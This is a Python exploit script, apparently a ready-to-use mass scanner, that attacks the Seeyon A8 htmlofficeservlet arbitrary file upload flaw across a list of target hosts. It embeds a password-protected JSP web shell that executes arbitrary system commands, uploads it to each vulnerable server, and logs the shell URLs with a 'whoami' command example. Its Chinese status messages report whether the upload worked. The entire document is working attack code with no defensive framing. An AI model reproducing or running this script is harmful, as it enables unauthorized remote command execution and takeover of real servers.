import requests
import sys
banner="""
 ______   _ _   _ _             
|  ____| (_) \ | (_)            
| |__ ___ _|  \| |_  __ _  ___  
|  __/ _ \ | . ` | |/ _` |/ _ \ 
| | |  __/ | |\  | | (_| | (_) |
|_|  \___|_|_| \_|_|\__,_|\___/ 
                version:1.1
"""
data = """
DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("calsee".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("
<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>>a6e4f045d4b8506bf492ada7e3390d7ce
"""

file_path = sys.argv[2]
file = open(file_path,'r',encoding='UTF-8').read().split()
payload = "/seeyon/htmlofficeservlet"
exp = "/seeyon/testtesta.jsp"

print(banner)

for i in file:
    if "http" not in i:
        i = "http://" + str(i)
    urls = i + payload
    expurl = i + exp
    try:
        reps = requests.get(url=urls, timeout=10, verify=False)
        if len(reps.text) != 0:
            print("\033[0;32;40m[+] {} 疑似存在致远A8-htmlofficeservlet任意文件上传漏洞！！！\033[0m".format(i))
            print("正在上传payload中.......")
            uploadpayload = requests.get(url=urls, data=data, timeout=10, verify=False)
            getexpurl = requests.get(url=expurl, timeout=10, verify=False)
            if getexpurl.status_code == 200:
                print(
                    "\033[4;33m[+] webshell上传成功，请访问 {}?pwd=calsee&cmd=cmd+/c+whoami 进行命令执行\033[0m".format(
                        expurl))
                f = open("results", "a+", encoding="utf-8")
                f.write("{}?pwd=calsee&cmd=cmd+/c+whoami".format(expurl))
                f.write("\n")
                f.close()
            else:
                print("\033[0;31;40m[-] {} 上传失败,请手工进行尝试 \033[0m".format(urls))
                print("\n")
        else:
            print("\033[0;31;40m[-] {} 未发现致远A8-htmlofficeservlet任意文件上传漏洞\033[0m".format(i))
    except Exception as e:
        print("url 访问失败{}".format(i))